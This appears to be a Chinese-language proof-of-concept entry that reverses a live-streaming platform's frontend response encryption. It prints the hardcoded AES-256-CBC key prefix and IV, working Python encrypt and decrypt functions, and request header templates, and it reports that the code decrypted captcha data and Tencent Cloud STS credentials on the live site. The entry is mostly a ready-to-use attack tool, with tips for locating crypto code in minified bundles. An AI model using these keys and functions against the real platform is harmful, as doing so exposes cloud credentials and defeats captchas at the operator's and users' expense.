# 多租户直播平台前端响应加密还原（AES-256-CBC 硬编码 key/IV + 时间戳尾部拼接）

- **code**: 多租户直播平台前端响应加密还原-aes-256-cbc-硬编码-key-iv-时间戳尾部拼接
- **kind**: script
- **category**: info-leak
- **component**: Vue SPA + Go gRPC-gateway（多租户直播平台「龙门直播」v10.8.21.9）
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-08 在 example.com 实测：解密 /api/config/getCommonConfig（135 项运营配置）、/api/captcha_path（滑块验证码 id/图片/y）、/api/captcha_verify（明文 false）、/api/qcloud_sts（腾讯云 STS 凭证）全部成功，闭环验证算法正确。
- **path**: pocs/多租户直播平台前端响应加密还原-aes-256-cbc-硬编码-key-iv-时间戳尾部拼接/poc.py
- **created_at**: 2026-10-08T14:51:41.489Z

## 描述

还原该多租户直播平台前端的响应加密：硬编码 AES-256-CBC 密钥/IV 与密文+时间戳打包格式，附 python 同款实现与 minified bundle 定位手法

## 用法

```
把 blob 换成任意接口响应里的 data 字段即可解出明文 JSON；构造加密请求体时用 encrypt()。密钥前缀与 IV 为该平台硬编码，跨租户（不同 reg-source 域名）通用。
```

## 正文

```
## 原理
该平台前端（webpack 打包的 app.js）用 CryptoJS 对**响应体**做统一加密：响应拦截器里 `IS_ENCRYPT===1` 时执行 `e.data.data = await decrypt(e.data.data)`。加密实现位于 webpack 模块 **15331**（导出 `CN`=加密、`aL`=解密）：

```js
// 加密（CN）
const t = Math.floor(Date.now()/1000).toString(16).toUpperCase();      // 8 位大写 hex 时间戳
const s = "ADKOPSTF" + "<某个 COS 图片 URL 的末 16 字符>" + t;          // = "ADKOPSTF%2003.40.51.jpeg" + t
const r = CryptoJS.AES.encrypt(CryptoJS.enc.Utf8.parse(明文),
          CryptoJS.enc.Utf8.parse(s),                                  // key = 32 字节 → AES-256
          {iv: CryptoJS.enc.Utf8.parse("ADKOPSTF%2003.40"), mode: CBC, padding: Pkcs7}).toString();
return encodeURIComponent(r) + t;                                      // base64 → urlencode，尾部拼 8 位时间戳

// 解密（aL）
const t = e.slice(-8), s = e.slice(0,-8), o = decodeURIComponent(s);
const key = "ADKOPSTF%2003.40.51.jpeg" + t;                            // 24 + 8 = 32 字节
const pt = CryptoJS.AES.decrypt(o, CryptoJS.enc.Utf8.parse(key),
           {iv: CryptoJS.enc.Utf8.parse("ADKOPSTF%2003.40"), mode: CBC, padding: Pkcs7})
           .toString(CryptoJS.enc.Utf8).trim();
```

## 常量（硬编码在 JS 里，跨该平台租户通用）
- key 前缀：`ADKOPSTF%2003.40.51.jpeg`（= `"ADKOPSTF"` + 某 COS 图片路径末 16 字符 `%2003.40.51.jpeg`）
- IV：`ADKOPSTF%2003.40`（16 字节）
- key = 前缀 + 密文尾部 8 位大写十六进制时间戳（AES-256-CBC/Pkcs7）
- 请求头模板：`Authorization: token=<token>; uid=<uid>`、`platform: 0`、`device-info: <device_no>`、`reg-source: <租户码>`、`lang: zh_cn`；响应 200 但 `status` 字段才是业务码（2=登录超时）。

## python 实现（可直接用）
```python
import base64, json, time, urllib.parse
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad, pad
KEY_PREFIX, IV = "ADKOPSTF%2003.40.51.jpeg", b"ADKOPSTF%2003.40"

def decrypt(blob):
    key = (KEY_PREFIX + blob[-8:]).encode()
    pt = unpad(AES.new(key, AES.MODE_CBC, IV).decrypt(
         base64.b64decode(urllib.parse.unquote(blob[:-8]))), 16)
    txt = pt.decode().strip()
    try: return json.loads(txt)
    except Exception: return txt

def encrypt(obj):
    ts = format(int(time.time()), "X")
    key = (KEY_PREFIX + ts).encode()
    ct = AES.new(key, AES.MODE_CBC, IV).encrypt(pad(json.dumps(obj).encode(), 16))
    return urllib.parse.quote(base64.b64encode(ct).decode()) + ts
```

## 定位方法（minified bundle 通用手法）
app.js 是单行 653KB：直接 `Select-String -Context` 会把整行吐出来，改为写脚本按**字节偏移切片**打印窗口，再 grep `encrypt|aesKey|IS_ENCRYPT|sm2|sm4`；模块边界形如 `15331:function(e,t,s){...}`。另可用 `IS_ENCRYPT` 出现处反查响应拦截器（同处可见请求头模板与 `device_no` 生成逻辑）。
```
